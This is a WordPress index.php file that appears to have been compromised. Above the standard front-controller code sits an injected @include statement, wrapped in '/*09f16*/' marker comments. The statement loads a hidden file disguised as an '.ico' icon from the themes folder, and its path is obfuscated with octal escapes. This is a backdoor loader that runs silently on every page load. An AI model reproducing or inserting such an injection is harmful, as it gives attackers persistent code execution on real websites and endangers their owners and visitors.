<?php
/*09f16*/

@include "\057op\164/l\141mp\160/h\164do\143s/\167p-\143on\164en\164/t\150em\145s/\05644\146a4\0666d\056ic\157";

/*09f16*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
